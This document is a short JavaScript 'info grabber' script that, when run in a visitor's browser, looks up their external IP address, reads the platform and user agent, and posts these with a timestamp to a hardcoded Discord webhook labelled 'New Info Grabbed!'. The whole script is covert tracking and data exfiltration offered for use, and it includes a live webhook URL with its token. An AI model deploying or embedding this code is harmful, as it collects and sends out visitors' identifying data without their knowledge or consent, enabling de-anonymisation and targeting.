(async () => {
    // Replace with your webhook URL
    const webhookUrl = 'https://discordapp.com/api/webhooks/1306923540418924595/bs9LVhT5wNKgAdqXmOzWgiVriiQebWHCXCRimxfz4ZTY7MLsUgL5o81RJelQWapDZ2JG';

    try {
        // Get external IP address using an API
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Get system information
        const os = navigator.platform; // Operating system
        const browser = navigator.userAgent; // Browser information
        const timeClick = new Date().toISOString(); // Click time

        // Prepare data to send to the webhook
        const message = {
            content: "New Info Grabbed!",
            embeds: [
                {
                    title: "User Information",
                    fields: [
                        {
                            name: "IP Address",
                            value: ip,
                            inline: true,
                        },
                        {
                            name: "Operating System",
                            value: os,
                            inline: true,
                        },
                        {
                            name: "Browser",
                            value: browser,
                            inline: false,
                        },
                        {
                            name: "Time of Click",
                            value: timeClick,
                            inline: false,
                        },
                    ],
                },
            ],
        };

        // Send the data to the webhook using fetch
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        });

        console.log('Info successfully sent to the webhook!');
    } catch (error) {
        console.error('Error grabbing info:', error);
    }
})();
